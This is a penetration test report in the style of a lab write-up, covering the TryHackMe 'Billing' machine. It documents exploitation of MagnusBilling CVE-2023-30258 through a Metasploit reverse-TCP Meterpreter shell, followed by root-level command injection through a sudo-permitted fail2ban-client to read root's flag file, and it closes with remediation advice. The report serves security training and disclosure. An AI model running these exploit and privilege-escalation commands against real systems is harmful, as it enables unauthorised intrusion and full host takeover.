# Penetration Test Report  
**Engagement:** TryHackMe - Billing  
**Date:** September 2025   
**Tester:** Colin S    

---

## Summary 
A penetration test was conducted against the TryHackMe Billing environment to assess the security of the deployed MagnusBilling application and underlying system. The assessment identified two high-impact vulnerabilities: An unauthenticated command injection in MagnusBilling permitted remote execution of arbitrary commands and local privilege escalation that enabled full root compromise.

Immediate recommendations are to update the MagnusBilling application to a patched version. User privileges should be reviewed to ensure low-privileged users cannot perform high-privilege actions on the host system.   
 
## Vulnerabilities  

### 1. Unauthenticated command injection
**CVSS v4.0 Base Score:** 8.8 (High)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:L/SC:N/SI:N/SA:N  

**CVSS Justification:** While CVSS v4.0 rates this issue at 8.8 (High), the vulnerability is an unauthenticated remote code execution. The related CVE is rated at a 9.8 (Critical) in CVSS v3.1. Although the exploited account is a low-privileged web user, the modelled rating in CVSS v4.0 is reduced. In practice, this risk is critical, and remediation should be prioritised immediately. 

**Summary:** An unauthenticated command injection in MagnusBilling permitted remote execution of arbitrary commands as the web user `asterisk`. This vulnerability can be exploited by attackers to execute arbitrary commands on the target system.  

**Background:** The current version of MagnusBilling in use by the organisation is vulnerable to CVE-2023-30258, which allows attackers to execute unauthenticated command injection attacks. As this is a known vulnerability, multiple exploits exist online. Attackers can use these to quickly gain access to the target. Once access is obtained, commands can be executed to perform a range of harmful actions.      

**Technical details & Evidence:**  The target host was exploited using Metasploit.
```bash
msfconsole
msf > use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258 
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > show options
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOSTS 10.201.117.117
RHOSTS => 10.201.117.117
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 10.4.12.97
LHOST => 10.4.12.97
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 10.4.12.97:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.201.117.117:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 5 seconds.
[*] Elapsed time: 5.54 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.201.117.117
[+] Deleted lXNeTcRvjvlN.php
[*] Meterpreter session 1 opened (10.4.12.97:4444 -> 10.201.117.117:38054) at 2025-09-23 21:08:15 +1000

meterpreter >
```
![Access - metasploit.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Billing/Images/Access%20-%20metasploit.png)  

Once initial access had been gained to the target the logged in user was able to navigate the file system and retrieve secrets.  
```bash
meterpreter > shell
Process 3384 created.
Channel 0 created.

whoami
asterisk
pwd
/var/www/html/mbilling/lib/icepay

cd /home
ls
debian
magnus
ssm-user
cd magnus
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
cat user.txt
```
![flag1 - flag.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Billing/Images/Flag1%20-%20flag.png)  

**Impact:** An unauthenticated remote attacker can execute arbitrary commands as the web user `asterisk`. The absence of authentication makes this vulnerability critical, as it enables information disclosure, persistence and local privilege escalation attempts which can significantly impact the organisation's business operations.    

**Remediation Advice:** It is strongly recommended to update MagnusBilling to the vendor-fixed release or apply the official patch immediately and block access to the vulnerable endpoint until updated. Rotate any credentials that could have been exposed and monitor web logs for exploitation indicators.  

---

### 2. Local privilege escalation
**CVSS v4.0 Base Score:** 9.3 (Critical)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N  

**CVSS Justification:** This vulnerability allows a low-privileged user to execute arbitrary commands as root, resulting in full system compromise. While CVSS v4.0 models this with a 9.3 (Critical) score, the practical impact is complete host takeover and remediation should be treated as an urgent priority.  

**Summary:** It was discovered that a low privilege user was permitted to execute the `fail2ban-client` with sudo and NOPASSWD. Privilege misconfigurations such as this allow attackers to run arbitrary commands as root, this enables full system compromise and access to sensitive data.  

**Background:** fail2ban exposes a management client `fail2ban-client` that can change jail actions at runtime. Jail actions are the processes triggered when fail2ban attempts to block an identified IP with multiple authentication errors. If a low-privileged user can execute this client via sudo as root, arbitrary shell commands can be injected into the jails, which can then be executed when actions are taken on the system to trigger fail2ban block actions. Attackers can use different techniques to execute actions as root, or escalate their privileges directly to the root user. 

**Technical details & Evidence:** Recon was undertaken on the target system and the logged in user to determine current privileges.  
```bash
sudo -l
Matching Defaults entries for asterisk on ip-10-201-117-117:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-201-117-117:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

On the discovery that the logged in user was able to execute the `fail2ban-client` with sudo and NOPASSWD. Multiple proof of concept examples exist on methods to exploit this misconfiguration. The chosen method is detailed in the Fail2ban Exploit in the appendices.  

Below are the commands used to perform the exploit along with a brief explanation of each line’s actions.  

This first command restarts and refreshes the service.  
```bash
sudo /usr/bin/fail2ban-client restart
```
The next command overwrites the action taken when banning an IP and replaces it with a command that copies `/root/root.txt` to `/tmp/root.txt` and then adjusts the permissions with `chmod` 
```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
```
The final command bans an IP address which then triggers the item we inserted above.  
```bash
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

When put into practice the below is the command flow used to move the `root.txt` file on the target system.  
```bash
sudo /usr/bin/fail2ban-client restart
Shutdown successful
2025-09-23 02:48:31,943 fail2ban.configreader   [2568]: WARNING 'allowipv6' not defined in 'Definition'. Using default one: 'auto'
Server ready
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
1
```
![Flag2 - commands.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Billing/Images/Flag2%20-%20commands.png)  

Once complete it can be verified that the `root.txt` file has been moved and is accessible to the logged in low-privilege user.  
```bash
cd /tmp
ls
root.txt
cat root.txt
```   
![Flag2 - flag.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Billing/Images/Flag2%20-%20flag.png)  

**Impact:** A low-privilege account that can run `fail2ban-client` with sudo can escalate to full root access, allowing complete compromise of the host. This may result in full system takeover, data exfiltration, and disruption of services.  

**Remediation Advice:** Remove `/usr/bin/fail2ban-client` from NOPASSWD sudo rules. Restrict sudo to only necessary commands for the user. Ensure Fail2Ban configuration and action scripts are owned by root and not writable by unprivileged users. Conduct regular audits of sudo permissions.  

---
## Appendices  
[CVSS 4.0](https://www.first.org/cvss/calculator/4-0)  
[CVE-2023-30258](https://nvd.nist.gov/vuln/detail/CVE-2023-30258)  
[CVE-2023-30258 Exploit](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/)  
[Fail2ban Exploit](https://packetstorm.news/files/189989)
